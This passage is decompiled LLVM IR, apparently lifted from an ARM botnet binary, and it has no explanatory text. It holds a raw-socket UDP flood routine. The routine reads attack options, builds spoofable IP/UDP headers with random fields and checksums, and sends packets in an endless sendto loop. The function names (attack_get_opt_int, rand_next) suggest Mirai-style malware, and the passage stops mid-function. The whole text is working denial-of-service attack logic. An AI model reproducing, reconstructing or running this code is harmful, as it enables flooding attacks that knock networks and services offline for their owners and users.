  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v18_8eec = load i32, i32* @sb, align 4
  %v27_8eec = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_8f08 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_8f0c = load i32, i32* @r5, align 4
  store i32 %v0_8f0c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f1c = load i32, i32* @r4, align 4
  store i32 %v0_8f1c, i32* %r0.global-to-local, align 4
  %v5_8f20 = inttoptr i32 %v0_8f0c to i32*
  %v6_8f20 = call i32 @attack_get_opt_int(i32 %v0_8f1c, i32* %v5_8f20, i32 2, i32 0)
  %v1_8f2c = urem i32 %v6_8f20, 256
  store i32 %v1_8f2c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_8f38 = load i32, i32* @r5, align 4
  store i32 %v0_8f38, i32* %r1.global-to-local, align 4
  %v0_8f3c = load i32, i32* @r4, align 4
  store i32 %v0_8f3c, i32* %r0.global-to-local, align 4
  %v5_8f40 = trunc i32 %v6_8f20 to i8
  %v6_8f44 = inttoptr i32 %v0_8f38 to i32*
  %v7_8f44 = call i32 @attack_get_opt_int(i32 %v0_8f3c, i32* %v6_8f44, i32 3, i32 65535)
  %v0_8f48 = load i32, i32* @r5, align 4
  store i32 %v0_8f48, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_8f58 = load i32, i32* @r4, align 4
  store i32 %v0_8f58, i32* %r0.global-to-local, align 4
  %v5_8f5c = inttoptr i32 %v0_8f48 to i32*
  %v6_8f5c = call i32 @attack_get_opt_int(i32 %v0_8f58, i32* %v5_8f5c, i32 4, i32 64)
  %v1_8f64 = urem i32 %v6_8f5c, 256
  store i32 %v1_8f64, i32* %ip.global-to-local, align 4
  %v0_8f68 = load i32, i32* @r5, align 4
  store i32 %v0_8f68, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_8f74 = load i32, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v6_8f7c = inttoptr i32 %v0_8f68 to i32*
  %v7_8f7c = call i32 @attack_get_opt_int(i32 %v0_8f74, i32* %v6_8f7c, i32 5, i32 0)
  %v1_8f88 = urem i32 %v7_8f7c, 256
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_8f94 = load i32, i32* @r5, align 4
  store i32 %v0_8f94, i32* %r1.global-to-local, align 4
  %v0_8f98 = load i32, i32* @r4, align 4
  store i32 %v0_8f98, i32* %r0.global-to-local, align 4
  %v5_8fa0 = inttoptr i32 %v0_8f94 to i32*
  %v6_8fa0 = call i32 @attack_get_opt_int(i32 %v0_8f98, i32* %v5_8fa0, i32 6, i32 65535)
  %v0_8fa8 = load i32, i32* @r5, align 4
  store i32 %v0_8fa8, i32* %r1.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v6_8fa0, i32* %sb.global-to-local, align 4
  %v0_8fb8 = load i32, i32* @r4, align 4
  store i32 %v0_8fb8, i32* %r0.global-to-local, align 4
  %v4_8fbc = inttoptr i32 %v0_8fa8 to i32*
  %v5_8fbc = call i32 @attack_get_opt_int(i32 %v0_8fb8, i32* %v4_8fbc, i32 7, i32 65535)
  %v0_8fc0 = load i32, i32* @r5, align 4
  store i32 %v0_8fc0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  store i32 %v5_8fbc, i32* @sl, align 4
  %v0_8fd0 = load i32, i32* @r4, align 4
  store i32 %v0_8fd0, i32* %r0.global-to-local, align 4
  %v4_8fd4 = inttoptr i32 %v0_8fc0 to i32*
  %v5_8fd4 = call i32 @attack_get_opt_int(i32 %v0_8fd0, i32* %v4_8fd4, i32 0, i32 512)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_8fe0 = load i32, i32* @r5, align 4
  store i32 %v0_8fe0, i32* %r1.global-to-local, align 4
  store i32 %v5_8fd4, i32* @r6, align 4
  %v0_8fe8 = load i32, i32* @r4, align 4
  store i32 %v0_8fe8, i32* %r0.global-to-local, align 4
  %v4_8fec = inttoptr i32 %v0_8fe0 to i32*
  %v5_8fec = call i32 @attack_get_opt_int(i32 %v0_8fe8, i32* %v4_8fec, i32 1, i32 1)
  %v2_8ff8 = load i32, i32* @global_var_25d48.57, align 4
  store i32 %v2_8ff8, i32* %r3.global-to-local, align 4
  %v1_8ffc = urem i32 %v5_8fec, 256
  store i32 %v1_8ffc, i32* %ip.global-to-local, align 4
  %v0_9000 = load i32, i32* @r5, align 4
  store i32 %v0_9000, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_9008 = load i32, i32* @r4, align 4
  store i32 %v0_9008, i32* %r0.global-to-local, align 4
  %v5_9010 = inttoptr i32 %v0_9000 to i32*
  %v6_9010 = call i32 @attack_get_opt_int(i32 %v0_9008, i32* %v5_9010, i32 25, i32 %v2_8ff8)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_9024 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v3_9024, i32* %r0.global-to-local, align 4
  %v7_9028 = icmp eq i32 %v3_9024, -1
  store i1 %v7_9028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9024, i32* @fp, align 4
  br i1 %v7_9028, label %dec_label_pc_93c8, label %dec_label_pc_9034

dec_label_pc_9034:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_903c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_903c, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_9050 = call i32 @__GI_setsockopt(i32 %v3_9024, i32 0, i32 3, i32 %v6_903c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_9050, i32* %r0.global-to-local, align 4
  %v7_9054 = icmp eq i32 %v5_9050, -1
  store i1 %v7_9054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9054, label %dec_label_pc_93c0, label %dec_label_pc_905c

dec_label_pc_905c:                                ; preds = %dec_label_pc_9034
  %v0_905c = load i32, i32* @r6, align 4
  store i32 1460, i32* %r3.global-to-local, align 4
  %v3_9068 = urem i32 %v0_905c, 65536
  store i32 %v3_9068, i32* %r2.global-to-local, align 4
  %v3_906c = icmp ugt i32 %v3_9068, 1459
  %v9_906c = icmp eq i32 %v3_9068, 1460
  store i1 %v9_906c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_906c, label %bb, label %bb48

bb:                                               ; preds = %dec_label_pc_905c
  store i32 1460, i32* %r2.global-to-local, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_905c, %bb
  %v0_90c8 = phi i32 [ %v3_9068, %dec_label_pc_905c ], [ 1460, %bb ]
  store i32 %v7_8f44, i32* %r0.global-to-local, align 4
  %v0_9078 = load i32, i32* %sb.global-to-local, align 4
  %v3_9080 = urem i32 %v0_9078, 65536
  store i32 %v3_9080, i32* %ip.global-to-local, align 4
  %v0_9084 = load i32, i32* @r7, align 4
  %v2_9084 = icmp eq i32 %v0_9084, 0
  store i1 %v2_9084, i1* %cpsr_z.global-to-local, align 1
  %v0_9088 = load i32, i32* @sl, align 4
  %v3_9088 = mul i32 %v0_9088, 65536
  br i1 %v2_9084, label %bb49, label %bb50

bb49:                                             ; preds = %bb48
  store i32 %v0_90c8, i32* %ip.global-to-local, align 4
  br label %bb50

bb50:                                             ; preds = %bb48, %bb49
  %v1_90b8 = phi i32 [ %v3_9080, %bb48 ], [ %v0_90c8, %bb49 ]
  %v3_9098 = urem i32 %v0_9088, 65536
  store i32 %v3_9098, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_90a0 = urem i32 %v7_8f44, 65536
  store i32 %v3_90a0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9084, label %.thread, label %dec_label_pc_90c0

.thread:                                          ; preds = %bb50
  %v2_90b4 = add nsw i32 %v1_90b8, 28
  store i32 %v2_90b4, i32* @sb, align 4
  %v2_90b8 = add nsw i32 %v1_90b8, 8
  store i32 %v2_90b8, i32* @sl, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_90c0:                                ; preds = %bb50
  %v1_90c8 = add nuw nsw i32 %v0_90c8, 28
  store i32 %v1_90c8, i32* @sb, align 4
  %v1_90cc = add nuw nsw i32 %v0_90c8, 8
  store i32 %v1_90cc, i32* @sl, align 4
  %tmp51 = mul i32 %v0_9078, 256
  %v3_90e0 = and i32 %tmp51, 65280
  %tmp52 = udiv i32 %v0_9078, 256
  %v4_90f0 = urem i32 %tmp52, 256
  %v5_90f0 = or i32 %v4_90f0, %v3_90e0
  store i32 %v5_90f0, i32* @r6, align 4
  store i32 %v3_9088, i32* %r1.global-to-local, align 4
  %tmp53 = mul nuw nsw i32 %v1_90c8, 256
  %v3_90fc = and i32 %tmp53, 65280
  store i32 %v3_90fc, i32* %r3.global-to-local, align 4
  %tmp54 = mul i32 %v0_9088, 256
  %v3_9100 = and i32 %tmp54, 65280
  %tmp55 = mul nuw nsw i32 %v1_90cc, 256
  %v3_9104 = and i32 %tmp55, 65280
  store i32 %v3_9104, i32* %ip.global-to-local, align 4
  %tmp56 = udiv i32 %v1_90c8, 256
  %v4_9108 = urem i32 %tmp56, 256
  %v5_9108 = or i32 %v4_9108, %v3_90fc
  store i32 %v5_9108, i32* @lr, align 4
  %tmp57 = udiv i32 %v0_9088, 256
  %v4_910c = urem i32 %tmp57, 256
  %v5_910c = or i32 %v4_910c, %v3_9100
  store i32 %v5_910c, i32* %r0.global-to-local, align 4
  %trunc = trunc i32 %v1_90cc to i16
  %rev = call i16 @llvm.bswap.i16(i16 %trunc)
  %tmp58 = mul i32 %v7_8f44, 256
  %v3_9114 = and i32 %tmp58, 65280
  store i32 %v3_9114, i32* %r2.global-to-local, align 4
  %tmp59 = udiv i32 %v7_8f44, 256
  %v4_9124 = urem i32 %tmp59, 256
  %v5_9124 = or i32 %v4_9124, %v3_9114
  store i32 %v5_9124, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  %v4_917c = sext i8 %v5_8f40 to i32
  %sext6 = mul nuw i32 %v5_9108, 65536
  %v4_9198 = sdiv i32 %sext6, 65536
  %sext7 = mul nuw i32 %v5_910c, 65536
  %v7_91cc = sdiv i32 %sext7, 65536
  %v1_918c = trunc i32 %v6_8f5c to i8
  %v3_91cc = sext i16 %rev to i32
  br label %dec_label_pc_912c

dec_label_pc_912c:                                ; preds = %.thread9, %dec_label_pc_90c0
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_9138 = call i32 @calloc(i32 1510, i32 1)
  store i32 %v2_9138, i32* %r0.global-to-local, align 4
  store i32 %v2_8f08, i32* %r3.global-to-local, align 4
  %v3_9140 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9140, i32* %r1.global-to-local, align 4
  %v2_9144 = load i32, i32* @r4, align 4
  %v5_9144 = mul i32 %v2_9144, 4
  %v6_9144 = add i32 %v5_9144, %v2_8f08
  %v7_9144 = inttoptr i32 %v6_9144 to i32*
  store i32 %v2_9138, i32* %v7_9144, align 4
  %v0_9148 = load i32, i32* %r3.global-to-local, align 4
  %v1_9148 = load i32, i32* %r1.global-to-local, align 4
  %v4_9148 = mul i32 %v1_9148, 4
  %v5_9148 = add i32 %v4_9148, %v0_9148
  %v6_9148 = inttoptr i32 %v5_9148 to i32*
  %v7_9148 = load i32, i32* %v6_9148, align 4
  store i32 %v7_9148, i32* %r0.global-to-local, align 4
  %v1_914c = inttoptr i32 %v7_9148 to i8*
  %v2_914c = load i8, i8* %v1_914c, align 1
  %tmp = urem i8 %v2_914c, 16
  %v1_9150 = zext i8 %tmp to i32
  %v1_9154 = or i32 %v1_9150, 64
  store i32 %v1_9154, i32* %r3.global-to-local, align 4
  %v1_9158 = trunc i32 %v1_9154 to i8
  store i8 %v1_9158, i8* %v1_914c, align 1
  %v0_915c = load i32, i32* %r0.global-to-local, align 4
  %v1_915c = inttoptr i32 %v0_915c to i8*
  %v2_915c = load i8, i8* %v1_915c, align 1
  %v1_9160 = and i8 %v2_915c, -16
  %v1_9164 = or i8 %v1_9160, 5
  store i32 %v1_8f88, i32* %ip.global-to-local, align 4
  %v0_916c = load i32, i32* %r1.global-to-local, align 4
  %v3_916c = mul i32 %v0_916c, 32
  store i32 %v3_916c, i32* %r2.global-to-local, align 4
  store i8 %v1_9164, i8* %v1_915c, align 1
  %v0_9174 = load i32, i32* %r1.global-to-local, align 4
  %v1_9174 = add i32 %v0_9174, 1
  store i32 %v1_9174, i32* @r4, align 4
  %v0_9178 = load i32, i32* %r2.global-to-local, align 4
  %tmp61 = mul i32 %v0_9174, -8
  %v5_9178 = add i32 %v0_9178, %tmp61
  store i32 %v5_9178, i32* %r2.global-to-local, align 4
  store i32 %v4_917c, i32* %r1.global-to-local, align 4
  %v2_9180 = load i32, i32* %r0.global-to-local, align 4
  %v3_9180 = add i32 %v2_9180, 1
  %v4_9180 = inttoptr i32 %v3_9180 to i8*
  store i8 %v5_8f40, i8* %v4_9180, align 1
  store i32 %v1_8f64, i32* %r3.global-to-local, align 4
  %v0_9188 = load i32, i32* %ip.global-to-local, align 4
  %v2_9188 = icmp eq i32 %v0_9188, 0
  store i1 %v2_9188, i1* %cpsr_z.global-to-local, align 1
  %v2_918c = load i32, i32* %r0.global-to-local, align 4
  %v3_918c = add i32 %v2_918c, 8
  %v4_918c = inttoptr i32 %v3_918c to i8*
  store i8 %v1_918c, i8* %v4_918c, align 1
  %v0_9190 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9190, label %.thread9, label %bb60

bb60:                                             ; preds = %dec_label_pc_912c
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_9194 = load i32, i32* %r0.global-to-local, align 4
  %v4_9194 = add i32 %v3_9194, 6
  %v5_9194 = inttoptr i32 %v4_9194 to i16*
  store i16 64, i16* %v5_9194, align 2
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_912c, %bb60
  store i32 %v4_9198, i32* %ip.global-to-local, align 4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_91a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a0 = add i32 %v2_91a0, 9
  %v4_91a0 = inttoptr i32 %v3_91a0 to i8*
  store i8 17, i8* %v4_91a0, align 1
  %v0_91a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_91a4 = trunc i32 %v0_91a4 to i16
  %v2_91a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91a4 = add i32 %v2_91a4, 2
  %v4_91a4 = inttoptr i32 %v3_91a4 to i16*
  store i16 %v1_91a4, i16* %v4_91a4, align 2
  store i32 %v6_9010, i32* %ip.global-to-local, align 4
  %v1_91ac = load i32, i32* %r0.global-to-local, align 4
  %v2_91ac = add i32 %v1_91ac, 12
  %v3_91ac = inttoptr i32 %v2_91ac to i32*
  store i32 %v6_9010, i32* %v3_91ac, align 4
  %v0_91b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_91b0 = load i32, i32* @r8, align 4
  %v2_91b0 = add i32 %v1_91b0, %v0_91b0
  store i32 %v2_91b0, i32* %r2.global-to-local, align 4
  %v1_91b4 = add i32 %v2_91b0, 16
  %v2_91b4 = inttoptr i32 %v1_91b4 to i32*
  %v3_91b4 = load i32, i32* %v2_91b4, align 4
  store i32 %v3_91b4, i32* %r3.global-to-local, align 4
  %v0_91b8 = load i32, i32* @r5, align 4
  %v1_91b8 = trunc i32 %v0_91b8 to i16
  %v2_91b8 = load i32, i32* %r0.global-to-local, align 4
  %v3_91b8 = add i32 %v2_91b8, 4
  %v4_91b8 = inttoptr i32 %v3_91b8 to i16*
  store i16 %v1_91b8, i16* %v4_91b8, align 2
  %v0_91bc = load i32, i32* %r0.global-to-local, align 4
  %v1_91bc = add i32 %v0_91bc, 20
  store i32 %v1_91bc, i32* %r1.global-to-local, align 4
  %v0_91c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_91c0 = add i32 %v0_91bc, 16
  %v3_91c0 = inttoptr i32 %v2_91c0 to i32*
  store i32 %v0_91c0, i32* %v3_91c0, align 4
  %v0_91c4 = load i32, i32* @r6, align 4
  %v1_91c4 = trunc i32 %v0_91c4 to i16
  %v2_91c4 = load i32, i32* %r0.global-to-local, align 4
  %v3_91c4 = add i32 %v2_91c4, 20
  %v4_91c4 = inttoptr i32 %v3_91c4 to i16*
  store i16 %v1_91c4, i16* %v4_91c4, align 2
  store i32 %v3_91cc, i32* %r0.global-to-local, align 4
  store i32 %v7_91cc, i32* %r3.global-to-local, align 4
  %v0_91d0 = load i32, i32* @r4, align 4
  %v1_91d0 = load i32, i32* @r7, align 4
  %v9_91d0 = icmp eq i32 %v0_91d0, %v1_91d0
  store i1 %v9_91d0, i1* %cpsr_z.global-to-local, align 1
  %v2_91d4 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d4 = add i32 %v2_91d4, 4
  %v4_91d4 = inttoptr i32 %v3_91d4 to i16*
  store i16 %rev, i16* %v4_91d4, align 2
  %v0_91d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_91d8 = trunc i32 %v0_91d8 to i16
  %v2_91d8 = load i32, i32* %r1.global-to-local, align 4
  %v3_91d8 = add i32 %v2_91d8, 2
  %v4_91d8 = inttoptr i32 %v3_91d8 to i16*
  store i16 %v1_91d8, i16* %v4_91d8, align 2
  %v0_91dc = load i32, i32* @r4, align 4
  store i32 %v0_91dc, i32* %stack_var_-44, align 4
  %v5_91e0 = icmp slt i32 %v0_91d0, %v1_91d0
  br i1 %v5_91e0, label %dec_label_pc_912c, label %dec_label_pc_91e4.preheader.loopexit

dec_label_pc_91e4.preheader.loopexit:             ; preds = %.thread9
  %v0_91e8.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_91e4.preheader

dec_label_pc_91e4.preheader:                      ; preds = %.thread, %dec_label_pc_91e4.preheader.loopexit
  %v0_91e8.pre = phi i32 [ %v0_91e8.pre.pre, %dec_label_pc_91e4.preheader.loopexit ], [ 0, %.thread ]
  %v3_9350 = icmp eq i32 %v6_9010, -1
  %v8_9350 = icmp eq i32 %v6_9010, -1
  %v3_9368 = icmp eq i32 %v3_90a0, 65535
  %v2_93a4 = icmp eq i32 %v1_8ffc, 0
  br label %dec_label_pc_91e4

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4, %dec_label_pc_91e4.preheader
  %v0_91e8 = phi i32 [ %v0_91e8.pre, %dec_label_pc_91e4.preheader ], [ 0, %dec_label_pc_92e4 ], [ 0, %dec_label_pc_91e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_91e8 = icmp eq i32 %v0_91e8, 0
  store i1 %v2_91e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_91e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_91f4:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_92e4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_9260, %dec_label_pc_91f4
  %v1_920c = phi i32 [ %v1_92d4, %dec_label_pc_9260 ], [ 0, %dec_label_pc_91f4 ]
  %v5_91fc = mul i32 %v1_920c, 24
  %v1_9200 = load i32, i32* @r8, align 4
  %v2_9200 = add i32 %v1_9200, %v5_91fc
  store i32 %v2_9200, i32* %r3.global-to-local, align 4
  store i32 %v2_8f08, i32* %r1.global-to-local, align 4
  %v1_9208 = add i32 %v2_9200, 20
  %v2_9208 = inttoptr i32 %v1_9208 to i8*
  %v3_9208 = load i8, i8* %v2_9208, align 1
  %v4_9208 = zext i8 %v3_9208 to i32
  store i32 %v4_9208, i32* %r2.global-to-local, align 4
  %v4_920c = mul i32 %v1_920c, 4
  %v5_920c = add i32 %v4_920c, %v2_8f08
  %v6_920c = inttoptr i32 %v5_920c to i32*
  %v7_920c = load i32, i32* %v6_920c, align 4
  store i32 %v7_920c, i32* @r5, align 4
  %v7_9210 = icmp eq i8 %v3_9208, 31
  store i1 %v7_9210, i1* %cpsr_z.global-to-local, align 1
  %v1_9214 = add i32 %v7_920c, 20
  store i32 %v1_9214, i32* @r6, align 4
  %tmp62 = icmp ult i8 %v3_9208, 32
  br i1 %tmp62, label %dec_label_pc_92f8, label %dec_label_pc_921c

dec_label_pc_921c:                                ; preds = %dec_label_pc_91f8
  store i32 %v6_9010, i32* %r3.global-to-local, align 4
  store i1 %v8_9350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_9350, label %dec_label_pc_9358, label %dec_label_pc_9228

dec_label_pc_9228:                                ; preds = %dec_label_pc_92f8, %dec_label_pc_921c
  store i32 %v3_90a0, i32* %ip.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_9368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9368, label %dec_label_pc_9374, label %dec_label_pc_923c

dec_label_pc_923c:                                ; preds = %dec_label_pc_9358.dec_label_pc_923c_crit_edge, %dec_label_pc_9228
  %v1_9240 = phi i32 [ %v1_9240.pre, %dec_label_pc_9358.dec_label_pc_923c_crit_edge ], [ 65535, %dec_label_pc_9228 ]
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  %v9_9240 = icmp eq i32 %v3_9080, %v1_9240
  store i1 %v9_9240, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_9240, label %dec_label_pc_9388, label %dec_label_pc_9248

dec_label_pc_9248:                                ; preds = %dec_label_pc_9374, %dec_label_pc_923c
  %v1_924c = phi i32 [ %v1_9380, %dec_label_pc_9374 ], [ %v1_9240, %dec_label_pc_923c ]
  store i32 %v3_9098, i32* %r1.global-to-local, align 4
  %v9_924c = icmp eq i32 %v3_9098, %v1_924c
  store i1 %v9_924c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_924c, label %dec_label_pc_939c, label %dec_label_pc_9254

dec_label_pc_9254:                                ; preds = %dec_label_pc_9388, %dec_label_pc_9248
  store i32 %v1_8ffc, i32* %r3.global-to-local, align 4
  store i1 %v2_93a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_93a4, label %dec_label_pc_9260, label %dec_label_pc_93b0

dec_label_pc_9260:                                ; preds = %dec_label_pc_9254, %dec_label_pc_939c, %dec_label_pc_93b0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9264 = load i32, i32* @r5, align 4
  %v3_9264 = add i32 %v2_9264, 10
  %v4_9264 = inttoptr i32 %v3_9264 to i16*
  store i16 0, i16* %v4_9264, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_926c = load i32, i32* @r5, align 4
  store i32 %v0_926c, i32* @r0, align 4
  %v2_9270 = call i32 @checksum_generic(i32 %v0_926c, i32 20)
  %v3_9270 = trunc i32 %v2_9270 to i16
  %v3_9274 = load i32, i32* @r5, align 4
  %v4_9274 = add i32 %v3_9274, 10
  %v5_9274 = inttoptr i32 %v4_9274 to i16*
  store i16 %v3_9270, i16* %v5_9274, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_927c = load i32, i32* @r6, align 4
  %v3_927c = add i32 %v2_927c, 6
  %v4_927c = inttoptr i32 %v3_927c to i16*
  store i16 0, i16* %v4_927c, align 2
  %v0_9280 = load i32, i32* @r6, align 4
  store i32 %v0_9280, i32* @r1, align 4
  %v1_9284 = add i32 %v0_9280, 4
  %v2_9284 = inttoptr i32 %v1_9284 to i16*
  %v3_9284 = load i16, i16* %v2_9284, align 2
  %v4_9284 = zext i16 %v3_9284 to i32
  store i32 %v4_9284, i32* %r2.global-to-local, align 4
  %v0_9288 = load i32, i32* @sl, align 4
  store i32 %v0_9288, i32* %r3.global-to-local, align 4
  %v0_928c = load i32, i32* @r5, align 4
  store i32 %v0_928c, i32* %r0.global-to-local, align 4
  %v4_9290 = call i32 @checksum_tcpudp(i32 %v0_928c, i32 %v0_9280, i32 %v4_9284, i32 %v0_9288)
  %v5_9290 = trunc i32 %v4_9290 to i16
  store i32 %v4_9290, i32* %r0.global-to-local, align 4
  %v3_9294 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9294, i32* %r3.global-to-local, align 4
  %v3_9298 = mul i32 %v3_9294, 32
  store i32 %v3_9298, i32* %lr.global-to-local, align 4
  %v3_929c = load i32, i32* @r6, align 4
  %v4_929c = add i32 %v3_929c, 6
  %v5_929c = inttoptr i32 %v4_929c to i16*
  store i16 %v5_9290, i16* %v5_929c, align 2
  %v0_92a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_92a0 = load i32, i32* %r3.global-to-local, align 4
  %tmp63 = mul i32 %v1_92a0, -8
  %v5_92a0 = add i32 %v0_92a0, %tmp63
  store i32 %v5_92a0, i32* %lr.global-to-local, align 4
  %v0_92a4 = load i32, i32* @r6, align 4
  %v1_92a4 = add i32 %v0_92a4, 2
  %v2_92a4 = inttoptr i32 %v1_92a4 to i16*
  %v3_92a4 = load i16, i16* %v2_92a4, align 2
  %v4_92a4 = zext i16 %v3_92a4 to i32
  store i32 %v4_92a4, i32* @r6, align 4
  %v1_92a8 = load i32, i32* @r8, align 4
  %v2_92a8 = add i32 %v1_92a8, %v5_92a0
  store i32 %v2_92a8, i32* @lr, align 4
  %v3_92ac = add i32 %v2_92a8, 2
  %v4_92ac = inttoptr i32 %v3_92ac to i16*
  store i16 %v3_92a4, i16* %v4_92ac, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_92b8 = load i32, i32* @r5, align 4
  store i32 %v0_92b8, i32* %r1.global-to-local, align 4
  %v0_92bc = load i32, i32* @fp, align 4
  store i32 %v0_92bc, i32* %r0.global-to-local, align 4
  %v0_92c0 = load i32, i32* @sb, align 4
  store i32 %v0_92c0, i32* %r2.global-to-local, align 4
  %v0_92c4 = load i32, i32* @lr, align 4
  %v6_92cc = call i32 @__libc_sendto(i32 %v0_92bc, i32 %v0_92b8, i32 %v0_92c0, i32 16384, i32 %v0_92c4, i32 16)
  %v3_92d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_92d0, i32* %r3.global-to-local, align 4
  %v1_92d4 = add i32 %v3_92d0, 1
  store i32 %v1_92d4, i32* %r0.global-to-local, align 4
  %v1_92d8 = load i32, i32* @r7, align 4
  %v9_92d8 = icmp eq i32 %v1_92d4, %v1_92d8
  store i1 %v9_92d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_92d4, i32* %stack_var_-44, align 4
  %v5_92e0 = icmp slt i32 %v1_92d4, %v1_92d8
  br i1 %v5_92e0, label %dec_label_pc_91f8, label %dec_label_pc_92e4

dec_label_pc_92e4:                                ; preds = %dec_label_pc_9260
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_92e8 = icmp eq i32 %v1_92d8, 0
  store i1 %v2_92e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_92e8, label %dec_label_pc_91e4, label %dec_label_pc_91f4

dec_label_pc_92f8:                                ; preds = %dec_label_pc_91f8
  %v1_92f8 = add i32 %v2_9200, 16
  %v2_92f8 = inttoptr i32 %v1_92f8 to i32*
  %v3_92f8 = load i32, i32* %v2_92f8, align 4
  %v0_92fc = call i32 @rand_next()
  store i32 %v0_92fc, i32* %r0.global-to-local, align 4
  %v3_9300 = load i32, i32* %stack_var_-44, align 4
  %v5_9308 = mul i32 %v3_9300, 24
  %v1_930c = and i32 %v3_92f8, 16711680
  store i32 %v1_930c, i32* %ip.global-to-local, align 4
  %v3_9310 = udiv i32 %v3_92f8, 16777216
  %v4_9314 = udiv i32 %v1_930c, 256
  %v5_9314 = or i32 %v4_9314, %v3_9310
  store i32 %v5_9314, i32* %r2.global-to-local, align 4
  %v1_9318 = load i32, i32* @r8, align 4
  %v2_9318 = add i32 %v1_9318, %v5_9308
  store i32 %v2_9318, i32* %r1.global-to-local, align 4
  %v1_931c = and i32 %v3_92f8, ptrtoint (i32* @global_var_ff00.32 to i32)
  store i32 %v1_931c, i32* %r3.global-to-local, align 4
  %v1_9320 = add i32 %v2_9318, 20
  %v2_9320 = inttoptr i32 %v1_9320 to i8*
  %v3_9320 = load i8, i8* %v2_9320, align 1
  %v4_9320 = zext i8 %v3_9320 to i32
  store i32 %v4_9320, i32* %ip.global-to-local, align 4
  %v4_9324 = mul i32 %v1_931c, 256
  %v4_9328 = mul i32 %v3_92f8, 16777216
  %v5_9324 = or i32 %v4_9324, %v4_9328
